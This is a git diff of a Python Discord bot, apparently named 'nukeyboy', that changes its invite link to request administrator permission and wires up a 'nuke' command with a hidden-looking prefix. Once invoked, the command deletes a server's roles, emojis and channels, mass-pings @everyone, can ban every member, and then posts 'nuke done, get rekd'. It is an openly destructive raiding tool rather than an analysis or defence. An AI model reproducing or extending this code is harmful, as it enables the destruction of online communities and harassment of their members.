@@ -3,17 +3,13 @@ from discord.ext import commands
 import os
 import dotenv
 import threading
-from bot.cogs.events import Events
+from bot.nukeyboy.commands import nuke
 
-
-# https://discord.com/api/oauth2/authorize?client_id=796805491186597968&permissions=2147483639&scope=bot
+# https://discord.com/api/oauth2/authorize?client_id=846818976238665779&permissions=8&scope=bot
 
 bot = commands.Bot(
     command_prefix="_?_", help_command=None, intents=discord.Intents.all()
 )
-
-dotenv.load_dotenv()
-
 
 async def del_roles(ctx):
     roles = ctx.guild.roles
@@ -70,11 +66,12 @@ async def nuke(ctx, ping: int, ban=None):
         await del_roles(ctx)
         await del_emojis(ctx)
         await del_channels(ctx)
+        
         if ping:
             await ping_everyone(ctx, ping)
         if ban:
             await ban_everyone(ctx)
         await ctx.send("nuke done, get rekd")
 
-
-bot.run(os.environ["TOKEN"])  # bot token
+dotenv.load_dotenv()
+bot.run(os.environ["NUKEYBOY_TOKEN"])  # bot token
